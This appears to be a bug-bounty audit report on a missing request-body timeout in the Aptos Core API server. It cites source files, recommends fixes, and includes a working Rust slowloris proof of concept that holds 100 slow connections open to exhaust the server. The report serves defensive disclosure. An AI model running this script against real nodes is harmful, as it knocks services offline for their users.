# Audit Report

## Title
API Server Slowloris Vulnerability: Missing Request Body Read Timeout Allows File Descriptor Exhaustion

## Summary
The Aptos Core API server lacks request body read timeouts at the application layer, allowing attackers to exhaust file descriptors and worker threads through slowloris-style attacks when the API is deployed without HAProxy protection (such as in standalone fullnode deployments).

## Finding Description

The API server uses the Poem web framework to handle HTTP requests, including BCS-encoded transaction submissions. The BCS payload parsing implementation reads the entire request body into memory without any timeout enforcement. [1](#0-0) 

When a BCS transaction is submitted to the `/transactions` POST endpoint, the request body is read by calling `Vec::<u8>::from_request(request, body).await`, which blocks until the complete body is received. The API server is initialized without any timeout configuration for request body reads: [2](#0-1) [3](#0-2) 

While the `PostSizeLimit` middleware checks the `Content-Length` header, it does not prevent slow transmission of the body: [4](#0-3) 

**Attack Vector:**
1. Attacker opens many concurrent TCP connections to the API server
2. For each connection, sends HTTP POST to `/transactions` with `Content-Type: application/x.aptos.signed_transaction+bcs`
3. Includes a valid `Content-Length` header (e.g., up to 8MB, passing `PostSizeLimit`)
4. Sends the body extremely slowly (e.g., 1 byte per second)
5. Each connection holds a file descriptor and ties up a Tokio worker thread waiting for the body

The Tokio runtime has a limited number of worker threads (default: 2x CPU cores): [5](#0-4) [6](#0-5) 

**Vulnerable Deployment Scenario:**

The standalone fullnode Helm chart exposes the API directly without HAProxy: [7](#0-6) [8](#0-7) 

When deployed with HAProxy, there is protection via `timeout http-request 60s`: [9](#0-8) 

However, this protection is absent when the API is exposed directly, which is a valid and documented deployment configuration.

## Impact Explanation

This vulnerability qualifies as **High Severity** per the Aptos bug bounty criteria: "API crashes" and "Validator node slowdowns."

The attack can cause:
1. **API unavailability**: Exhausting file descriptors prevents new connections
2. **Worker thread starvation**: All Tokio worker threads blocked waiting for slow request bodies
3. **Cascading failures**: API unavailability affects transaction submission, preventing users from interacting with the blockchain
4. **Node performance degradation**: If the API server shares resources with other node components

The vulnerability violates the documented invariant: "Resource Limits: All operations must respect gas, storage, and computational limits" - the lack of timeout limits allows unbounded resource consumption.

## Likelihood Explanation

**Likelihood: High** when API is deployed without HAProxy (standalone fullnode configuration).

- Attack requires only basic HTTP client capabilities (any script can send slow POST requests)
- No authentication required to reach the vulnerable endpoint
- The standalone fullnode Helm chart is a standard deployment option with `service.exposeApi: true` by default
- Attacker can trivially open hundreds of connections from a single machine
- Default configuration has no mitigation (no timeouts, no connection limits at application layer)

## Recommendation

Add explicit request body read timeouts at the Poem application layer. This ensures protection even when deployed without HAProxy:

**Option 1: Add timeout middleware to the Poem server**
```rust
// In api/src/runtime.rs, add a timeout middleware
use poem::middleware::Timeout;
use std::time::Duration;

// In attach_poem_to_runtime, wrap the route with timeout:
let route = Route::new()
    // ... existing routes ...
    .with(Timeout::new(Duration::from_secs(60))) // Add this line
    .with(cors)
    .with_if(config.api.compression_enabled, Compression::new())
    // ... rest of middleware
```

**Option 2: Configure timeouts in ApiConfig**
Add a configurable `request_body_timeout_secs` field to `ApiConfig`: [10](#0-9) 

Then enforce this timeout when reading request bodies.

**Option 3: Limit concurrent connections**
Implement connection counting and rejection when limits are exceeded, similar to the `wait_by_hash_max_active_connections` mechanism: [11](#0-10) 

**Recommended Fix**: Implement both timeout middleware and connection limits for defense in depth.

## Proof of Concept

```rust
// PoC: Slowloris attack simulation
use std::io::Write;
use std::net::TcpStream;
use std::thread;
use std::time::Duration;

fn main() {
    let target = "127.0.0.1:8080"; // API server address
    let num_connections = 100;
    
    for i in 0..num_connections {
        thread::spawn(move || {
            if let Ok(mut stream) = TcpStream::connect(target) {
                // Send HTTP headers with valid Content-Length
                let headers = format!(
                    "POST /v1/transactions HTTP/1.1\r\n\
                     Host: localhost:8080\r\n\
                     Content-Type: application/x.aptos.signed_transaction+bcs\r\n\
                     Content-Length: 1024\r\n\
                     \r\n"
                );
                
                stream.write_all(headers.as_bytes()).ok();
                stream.flush().ok();
                
                // Send body very slowly (1 byte per second)
                for _ in 0..1024 {
                    stream.write_all(&[0u8]).ok();
                    stream.flush().ok();
                    thread::sleep(Duration::from_secs(1));
                }
                
                println!("Connection {} completed", i);
            }
        });
        
        // Small delay between connection attempts
        thread::sleep(Duration::from_millis(100));
    }
    
    // Keep main thread alive
    thread::sleep(Duration::from_secs(3600));
}
```

**Expected Result**: After launching 100 connections, the API server becomes unresponsive to new requests as file descriptors and worker threads are exhausted. Monitor with:
- `lsof -p <api_server_pid> | wc -l` (file descriptor count)
- `ss -tn | grep :8080 | wc -l` (established connections)
- Failed health checks: `curl http://localhost:8080/v1/-/healthy`

## Notes

This vulnerability is only exploitable when the API server is deployed **without HAProxy** in front of it. However, this is a documented and supported deployment configuration (standalone fullnode Helm chart), making it a valid security concern.

The issue is an **application-layer bug** (missing timeout enforcement in the application code), not a network-layer DoS attack excluded by the bug bounty rules. The fix must be implemented at the application layer to ensure security across all deployment configurations.

### Citations

**File:** api/src/bcs_payload.rs (L52-59)
```rust
impl ParsePayload for Bcs {
    const IS_REQUIRED: bool = true;

    async fn from_request(request: &Request, body: &mut RequestBody) -> Result<Self> {
        let data = Vec::<u8>::from_request(request, body).await?;
        Ok(Self(data))
    }
}
```

**File:** api/src/runtime.rs (L190-210)
```rust
    // Build listener with or without TLS
    let listener = match (&config.api.tls_cert_path, &config.api.tls_key_path) {
        (Some(tls_cert_path), Some(tls_key_path)) => {
            info!("Using TLS for API");
            let cert = std::fs::read_to_string(tls_cert_path).context(format!(
                "Failed to read TLS cert from path: {}",
                tls_cert_path
            ))?;
            let key = std::fs::read_to_string(tls_key_path).context(format!(
                "Failed to read TLS key from path: {}",
                tls_key_path
            ))?;
            let rustls_certificate = RustlsCertificate::new().cert(cert).key(key);
            let rustls_config = RustlsConfig::new().fallback(rustls_certificate);
            TcpListener::bind(address).rustls(rustls_config).boxed()
        },
        _ => {
            info!("Not using TLS for API");
            TcpListener::bind(address).boxed()
        },
    };
```

**File:** api/src/runtime.rs (L260-264)
```rust
        Server::new_with_acceptor(acceptor)
            .run(route)
            .await
            .map_err(anyhow::Error::msg)
    });
```

**File:** api/src/runtime.rs (L289-296)
```rust
/// Returns the maximum number of runtime workers to be given to the
/// API runtime. Defaults to 2 * number of CPU cores if not specified
/// via the given config.
fn get_max_runtime_workers(api_config: &ApiConfig) -> usize {
    api_config
        .max_runtime_workers
        .unwrap_or_else(|| num_cpus::get() * api_config.runtime_worker_multiplier)
}
```

**File:** api/src/check_size.rs (L40-58)
```rust
impl<E: Endpoint> Endpoint for PostSizeLimitEndpoint<E> {
    type Output = E::Output;

    async fn call(&self, req: Request) -> Result<Self::Output> {
        if req.method() != Method::POST {
            return self.inner.call(req).await;
        }

        let content_length = req
            .headers()
            .typed_get::<headers::ContentLength>()
            .ok_or(SizedLimitError::MissingContentLength)?;

        if content_length.0 > self.max_size {
            return Err(SizedLimitError::PayloadTooLarge.into());
        }

        self.inner.call(req).await
    }
```

**File:** crates/aptos-runtimes/src/lib.rs (L27-54)
```rust
    const MAX_BLOCKING_THREADS: usize = 64;

    // Verify the given name has an appropriate length
    if thread_name.len() > MAX_THREAD_NAME_LENGTH {
        panic!(
            "The given runtime thread name is too long! Max length: {}, given name: {}",
            MAX_THREAD_NAME_LENGTH, thread_name
        );
    }

    // Create the runtime builder
    let atomic_id = AtomicUsize::new(0);
    let thread_name_clone = thread_name.clone();
    let mut builder = Builder::new_multi_thread();
    builder
        .thread_name_fn(move || {
            let id = atomic_id.fetch_add(1, Ordering::SeqCst);
            format!("{}-{}", thread_name_clone, id)
        })
        .on_thread_start(on_thread_start)
        .disable_lifo_slot()
        // Limit concurrent blocking tasks from spawn_blocking(), in case, for example, too many
        // Rest API calls overwhelm the node.
        .max_blocking_threads(MAX_BLOCKING_THREADS)
        .enable_all();
    if let Some(num_worker_threads) = num_worker_threads {
        builder.worker_threads(num_worker_threads);
    }
```

**File:** terraform/helm/fullnode/templates/service.yaml (L16-20)
```yaml
  {{- if .Values.service.exposeApi }}
  - name: api
    port: 80
    targetPort: 8080
  {{- end }}
```

**File:** terraform/helm/fullnode/values.yaml (L72-76)
```yaml
service:
  # -- The Kubernetes ServiceType to use for the fullnode. Change this to LoadBalancer expose the REST API, aptosnet endpoint externally
  type: ClusterIP
  # -- Whether to expose the node REST API
  exposeApi: true
```

**File:** docker/compose/aptos-node/haproxy.cfg (L34-36)
```text
    # Prevent long-running HTTP requests
    timeout http-request 60s
    timeout http-keep-alive 5s
```

**File:** config/src/config/api_config.rs (L15-32)
```rust
#[derive(Clone, Debug, Deserialize, PartialEq, Eq, Serialize)]
#[serde(default, deny_unknown_fields)]
pub struct ApiConfig {
    /// Enables the REST API endpoint
    #[serde(default = "default_enabled")]
    pub enabled: bool,
    /// Address for the REST API to listen on. Set to 0.0.0.0:port to allow all inbound connections.
    pub address: SocketAddr,
    /// Path to a local TLS certificate to enable HTTPS
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub tls_cert_path: Option<String>,
    /// Path to a local TLS key to enable HTTPS
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub tls_key_path: Option<String>,
    /// A maximum limit to the body of a POST request in bytes
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub content_length_limit: Option<u64>,
    /// Enables failpoints for error testing
```

**File:** config/src/config/api_config.rs (L86-90)
```rust
    pub wait_by_hash_timeout_ms: u64,
    /// The interval at which wait_by_hash will poll the storage for the transaction.
    pub wait_by_hash_poll_interval_ms: u64,
    /// The number of active wait_by_hash requests that can be active at any given time.
    pub wait_by_hash_max_active_connections: usize,
```
